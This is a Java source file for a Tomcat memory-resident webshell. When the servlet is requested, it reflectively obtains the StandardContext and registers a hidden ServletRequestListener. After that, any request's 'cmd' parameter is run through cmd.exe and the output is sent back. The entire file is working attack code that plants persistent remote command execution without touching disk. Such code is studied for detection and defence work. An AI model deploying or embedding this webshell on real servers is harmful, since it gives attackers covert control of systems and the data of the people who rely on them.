package com.tomcat.memshell.Listener;

import com.tomcat.util.ClassUtil;
import org.apache.catalina.connector.Request;
import org.apache.catalina.core.ApplicationContext;
import org.apache.catalina.core.StandardContext;

import javax.servlet.*;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.io.InputStream;
import java.io.PrintWriter;
import java.lang.reflect.Field;
import java.util.Scanner;

public class KoishiMemListener extends HttpServlet {
    @Override
    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
        try{
            // 获取 StandardContext#addApplicationEventListener
/*            ServletContext servletContext = req.getSession().getServletContext();
            Field servletfield = servletContext.getClass().getDeclaredField("context");
            servletfield.setAccessible(true);
            ApplicationContext applicationContext = (ApplicationContext) servletfield.get(servletContext);
            Field contextfield = applicationContext.getClass().getDeclaredField("context");
            contextfield.setAccessible(true);
            StandardContext standardContext = (StandardContext) contextfield.get(applicationContext);*/

            org.apache.catalina.loader.WebappClassLoaderBase webappClassLoaderBase = (org.apache.catalina.loader.WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
            StandardContext standardContext = (StandardContext) webappClassLoaderBase.getResources().getContext();

            //新建 Listener 不用像之前那样使用 wrapper 包装了，直接add即可
            //Class<?> classListener = ClassUtil.getClass(ClassUtil.LISTENER_STRING);
            MyListener listener = new MyListener();
            standardContext.addApplicationEventListener(listener);

            PrintWriter writer = resp.getWriter();
            writer.println("inject KoishiMemListener success !");
        }catch (Exception e){
            e.printStackTrace();
        }
    }
    public class MyListener implements ServletRequestListener {
        public void requestDestroyed(ServletRequestEvent sre) {
            HttpServletRequest req = (HttpServletRequest) sre.getServletRequest();
            if (req.getParameter("cmd") != null){
                InputStream in = null;
                try {
                    in = Runtime.getRuntime().exec(new String[]{"cmd.exe","/c",req.getParameter("cmd")}).getInputStream();
                    Scanner s = new Scanner(in).useDelimiter("\\A");
                    String out = s.hasNext()?s.next():"";
                    Field requestF = req.getClass().getDeclaredField("request");
                    requestF.setAccessible(true);
                    Request request = (Request)requestF.get(req);
                    request.getResponse().getWriter().write(out);
                    request.getResponse().getWriter().flush();
                    request.getResponse().getWriter().close();
                }

                catch (IOException e) {}
                catch (NoSuchFieldException e) {}
                catch (IllegalAccessException e) {}
            }
        }

        public void requestInitialized(ServletRequestEvent sre) {}
    }
}
